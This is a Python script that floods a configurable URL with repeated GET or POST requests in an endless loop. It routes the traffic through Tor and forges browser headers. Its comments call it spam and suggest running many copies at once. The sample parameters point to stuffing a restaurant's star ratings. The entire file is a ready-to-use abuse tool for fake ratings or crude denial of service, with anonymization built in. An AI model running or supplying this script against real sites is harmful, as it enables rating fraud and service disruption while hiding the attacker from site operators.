#!/usr/bin/python3

import requests
import random

# pip install requests requests[socks] random
# ./script.py & ./script.py & [...] ./script.py (For a faster spam)

########## Change this ##########
# Basic configuration
url = "http://target.com/page/" # Url to spam
method = "GET" # Method GET or POST
data = {'Restaurant': 'the chef\'s table', 'star': '5'} # Parameters to send

# Tor configuration
use_tor = "YES" # YES/NO
tor_ip_proxy = "localhost" # Tor proxy IP
torport = 9050 # Proxy Tor port (9050 by default)


########## Program ##########
if use_tor == "YES":
    proxies = {
        'http': "socks5h://"+tor_ip_proxy+":{}".format(torport),
        'https': "socks5h://"+tor_ip_proxy+":{}".format(torport)
        }
elif use_tor == "NO":
    proxies = {}
else:
    print("[-] Error (Invalid Tor settings)")

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'max-age=0',
    'From': url,
    'Referer': url
}

i = 0

while True:
    try:
        if method == "GET":
            response = requests.get(url, headers=headers, verify=False, proxies=proxies, params=data)
        elif method == "POST":
            response = requests.post(url, headers=headers, verify=False, proxies=proxies, data=data)
        else:
            print("[-] Error (Bad method)")
            exit()
        
        print("[+] OK", i)
        i += 1
    except:
        print("[-] Error")
      
